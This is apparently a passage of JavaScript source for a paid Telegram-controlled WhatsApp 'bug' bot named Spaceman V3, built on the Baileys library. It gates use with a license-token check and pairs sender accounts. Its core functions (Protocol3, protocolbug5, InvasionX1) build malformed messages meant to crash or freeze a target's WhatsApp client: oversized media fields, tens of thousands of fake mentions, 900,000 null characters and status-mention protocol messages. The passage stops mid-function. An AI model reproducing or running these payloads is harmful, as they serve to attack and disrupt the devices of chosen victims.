const fs = require('fs');
const path = require('path');
const https = require('https');
const { default: makeWASocket,
  useMultiFileAuthState,
  jidDecode, 
  downloadContentFromMessage, 
  emitGroupParticipantsUpdate, 
  emitGroupUpdate, 
  generateWAMessageContent, 
  generateWAMessage, 
  makeInMemoryStore, 
  prepareWAMessageMedia, 
  generateWAMessageFromContent, 
  MediaType, 
  areJidsSameUser, 
  WAMessageStatus, 
  downloadAndSaveMediaMessage, 
  AuthenticationState, 
  GroupMetadata, 
  initInMemoryKeyStore, 
  getContentType, 
  MiscMessageGenerationOptions, 
  useSingleFileAuthState,
  BufferJSON, 
  WAMessageProto, 
  MessageOptions, 
  WAFlag, WANode, 
  WAMetric,
  ChatModification,
  MessageTypeProto, 
  WALocationMessage, 
  ReconnectMode, 
  WAContextInfo, 
  proto, 
  WAGroupMetadata, 
  ProxyAgent, 
  waChatKey, 
  MimetypeMap, 
  MediaPathMap, 
  WAContactMessage, 
  WAContactsArrayMessage, 
  WAGroupInviteMessage, 
  WATextMessage, 
  WAMessageContent, 
  WAMessage, 
  BaileysError, 
  WA_MESSAGE_STATUS_TYPE, 
  MediaConnInfo, 
  URL_REGEX, 
  WAUrlInfo, 
  WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, 
  mentionedJid,
  processTime, 
  Browser, 
  MessageType, 
  Presence, 
  WA_MESSAGE_STUB_TYPES, 
  Mimetype, relayWAMessage, 
  Browsers, 
  GroupSettingChange, 
  DisconnectReason, 
  WASocket, 
  getStream, 
  WAProto, 
  isBaileys, 
  AnyMessageContent, 
  fetchLatestBaileysVersion,
  templateMessage, 
  InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const crypto = require('crypto');
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
const chalk = require('chalk');
const { fromBuffer } = require('file-type');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const JsConfuser = require('js-confuser');
const global = require('./Config.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./ボルテックスバグ/superVip.json'));
let premiumUsers = [];
if (fs.existsSync('./ボルテックスバグ/premium.json')) {
  premiumUsers = JSON.parse(fs.readFileSync('./ボルテックスバグ/premium.json'));
}
let OwnerUsers = JSON.parse(fs.readFileSync('./ボルテックスバグ/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./ボルテックスバグ/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./ボルテックスバグ/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./ボルテックスバグ/security.json'));
const owner = global.owner;
const cd = "./ボルテックスバグ/cooldown.json";
const sessions = new Map();
const SESSIONS_DIR = "./sender";
const SESSIONS_FILE = "./sender/active_sender.json";
const axios = require('axios');

// CD
const cooldowns = new Map();
const defaultCooldowns = 60;

const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const days = Math.floor(uptimeSeconds / (3600 * 24));
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${seconds} Detik`;
};

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/lrzozz256/db_spaceman/refs/heads/main/token.json";
const BOT_TOKEN = global.botToken; // Ambil dari ENV atau ubah sesuai kebutuhan


async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("MAAF SC DI ERROR KAN OLEH DEVELOPER !!", error.message));
    return [];
  }
}

async function validateToken() {
  console.clear();
  const validTokens = await fetchValidTokens();
  
  if (!BOT_TOKEN || !validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠤⠤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡶⠛⠉⠀⠀⠀⠀⠀⠀⠈⠙⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⢀⢖⡿⠛⠻⣿⣶⣄⠀⠀⢀⣴⣶⣶⣶⣶⣄⠀⠀⢻⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣜⢸⣇⣀⣠⣿⣿⣿⣆⣰⡏⠀⢹⣿⣿⣿⣿⣿⡀⣾⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⡘⣿⣿⣿⣿⢿⣿⣿⣿⣿⣾⣿⣿⡛⢻⣿⢸⣷⡇⠀⠀⠀⠀⠀⠀
⠀⣤⠤⣼⠉⠷⣌⣻⠿⣿⣦⣼⡿⠘⢿⣿⣿⣿⠿⢛⣥⣾⣿⣀⢀⣠⣤⡀⠀⠀
⠈⠧⣄⡀⠀⠀⠈⠻⢭⣉⠉⠁⠀⠀⠀⠉⢉⣙⣯⠿⠛⠁⠀⠉⠉⠁⢸⡇⠀⠀
⠀⢀⡞⠁⠀⠀⠀⢀⣴⠈⠑⠀⠀⠚⠛⠋⠉⠉⠘⣶⢢⡄⠀⠀⠀⠀⠀⠉⢲⡀
⠀⠘⠧⠴⠞⢦⡀⣸⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⣹⠂⠀⠀⠀⢰⠶⠚⠁
⠀⠀⠀⠀⠀⠀⠛⢃⡿⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⣇⢿⣰⠾⠷⣆⣸⠆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢈⡿⠉⠉⠉⠙⠛⢲⡒⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠦⠴⠛⠁⠀⠀⠀⠀⠀⠀⠛⠦⢤⠼⠃⠀⠀⠀⠀⠀⠀⠀
LAWAK PENYUSUP KONTOL, BUY AKSES KE TELE @thezzyxopois / @xgood00`));
    process.exit(1);
  }
  
  console.clear();
  console.log(chalk.yellow(`⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⢀⣴⣶⣶⣶⣶⣄⠀⣀⣴⣶⣶⣶⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣸⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀⠀⠈⠻⢿⢿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠆⠠⣿⡿⣿⣿⣿⢿⣿⣦⣴⣿⡿⠿⢿⣿⣷⣄⠀⢾⣿⣿⣿⣿⡿⣿⠆⢸⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣿⣧⠀⠀⠀⠀⣠⣿⡿⠁⠀⣰⣿⡿⠁⠀⠀⠀⠈⠻⣿⣧⡀⠀⠘⣿⡟⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⡀⠀⢰⣿⡿⠁⠀⠀⣿⣿⠁⠀⠀⠀⠀⠀⠀⢻⣿⣇⠀⠀⣿⡇⠀⠀⠀⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⣴⣿⡟⠀⠀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⡏⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠀⣿⣿⡄⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⣿⣧⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣇⣀⡀⠀⠀⠀⠘⢿⣿⣦⣀⠀⢀⣠⣾⣿⠏⠀⠀⠀⢿⣿⣦⡀⠀⠀⣀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠙⠿⢿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠙⠿⢿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀`));
  startBot();
}

function startBot() {
  console.log(chalk.bold.blue(`
═════════════════════════
  🚀🚀SPACEMAN 🥵🥶 V3
═════════════════════════
`));

console.log(chalk.blue(`
------ (  𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙻𝙾𝙶𝙸𝙽 ) ------
------ (  𝚃𝙷𝙰𝙽𝙺 𝚈𝙾𝚄 𝙵𝙾𝚁 𝙱𝚄𝚈𝙸𝙽𝙶 𝚃𝙷𝙸𝚂 𝚂𝙲𝚁𝙸𝙿𝚃 ) ------
`));
}

validateToken();

let sock;
let whatsappStatus = false;

function saveActiveSessions(number) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(number)) {
        sessions.push(...existing, number);
      }
    } else {
      sessions.push(number);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function startWhatsapp() {
   if (fs.existsSync(SESSIONS_FILE)) {
  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.blue(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));
   for (const number of activeNumbers) {
      console.log(chalk.bold.blue(`Mencoba menghubungkan WhatsApp: ${number}`));
  const sessionDir = createSessionDir(number);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
          console.log(chalk.blue.bold(`Mencoba menghubungkan ulang bot ${number}...`));
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        sessions.set(number, sock);
        console.log(chalk.bold.yellow(`Sender ${number} Berhasil Terhubung!`));
    }
  });
  }
}
}
function createSessionDir(number) {
  const deviceDir = path.join(SESSIONS_DIR, `device_sender_${number}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }
  const sessionDir = createSessionDir(number);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `🚫 Nomor ini ${number} \nTelah terputus dari WhatsApp harap sambungkan kembali.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `😂 Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              fs.rmSync(sessionDir, { recursive: true, force: true });
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          sessions.set(number, sock);
          saveActiveSessions(number);
          bot.sendMessage(chatId, `⚡ Nomor ini ${number} \nBerhasil terhubung`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber.trim(), "SPACEMAN");
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid Bang : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./ボルテックスバグ/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./ボルテックスバグ/Owner.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./ボルテックスバグ/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./ボルテックスバグ/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./ボルテックスバグ/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
function parseDuration(input) {
  const match = input.trim().match(/^(\d+)([smhd])$/i);
  if (!match) return null;
  const value = parseInt(match[1], 10);
  const unit = match[2].toLowerCase();
  switch (unit) {
    case 's': return value;
    case 'm': return value * 60;
    case 'h': return value * 3600;
    case 'd': return value * 86400;
    default: return null;
  }
}

function isUserInCooldown(userId) {
  const now = Date.now();
  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    const remaining = Math.ceil((expireTime - now) / 1000);
    return { inCooldown: true, remaining };
  }

  return { inCooldown: false };
}

watchFile('./ボルテックスバグ/premium.json', (data) => (premiumUsers = data));
watchFile('./ボルテックスバグ/admin.json', (data) => (adminUsers = data));
watchFile('./ボルテックスバグ/banned.json', (data) => (bannedUser = data));
watchFile('./ボルテックスバグ/superVip.json', (data) => (superVip = data));
watchFile('./ボルテックスバグ/security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "⚡ Spaceman",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function Protocol3(target) {
  const pesanViewOnce = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 9999,
          width: 9999,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from({ length: 3000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  // Generate pesan WA dari konten
  const pesanWA = generateWAMessageFromContent(target, pesanViewOnce, {});

  // Kirim ke status@broadcast
  await sock.relayMessage("status@broadcast", pesanWA.message, {
    messageId: pesanWA.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
    const protocolMsg = {
      key: pesanWA.key,
      type: 25
    };

    const messagePayload = {
      message: {
        protocolMessage: protocolMsg
      }
    };

    const metaMention = {
      tag: "meta",
      attrs: {
        is_status_mention: "true"
      },
      content: undefined
    };

    await sock.relayMessage(target, { statusMentionMessage: messagePayload }, {
      additionalNodes: [metaMention]
    });
    const videoPayload = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "99999999",
          seconds: 9999999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "(🐉) SPACEMAN BOS 🔥",
          height: 99999,
          width: 99999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [target]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "kontol",
                songId: "kontol",
                author: "<! WKWKWKWK DELAY !>",
                title: "Delay Protocol - Spaceman🔥",
                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                artistAttribution: "https://t.me/lrzozz",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
              }
            },
            embeddedAction: true
          }]
        }
      }
    }
  };

  const waMessage = generateWAMessageFromContent(target, videoPayload, {});

  // Kirim ke status broadcast
  await sock.relayMessage("status@broadcast", waMessage.message, {
    messageId: waMessage.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });
    const protocolMsgX = {
      key: waMessage.key,
      type: 25
    };

    const payloadMentionQ = {
      message: {
        protocolMessage: protocolMsgX
      }
    };

    const metaMentionP = {
      tag: "meta",
      attrs: {
        is_status_mention: "true"
      },
      content: undefined
    };

    await sock.relayMessage(target, { groupStatusMentionMessage: payloadMentionQ}, {
      additionalNodes: [metaMentionP]
});
}

async function protocolbug5(isTarget) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "</> Spaceman Delay🔥 " + "ោ៝".repeat(10000),
        title: "Spaceman Ni Bos ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Janga nangis deck",
        height: 1020,
        width: 1020,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "trigger ch (@ozzy)"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });
        await sock.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
}
    
async function InvasionX1(target) {
try {
        let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "\u0000".repeat(900000),
                    contentText:
                        "𑲭𑲭☇ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫 𐎟𑆻",
                    footerText: "⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸",
                    buttons: [
                        {
                            buttonId: ".glitch",
                            buttonText: {
                                displayText: "𐎟⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
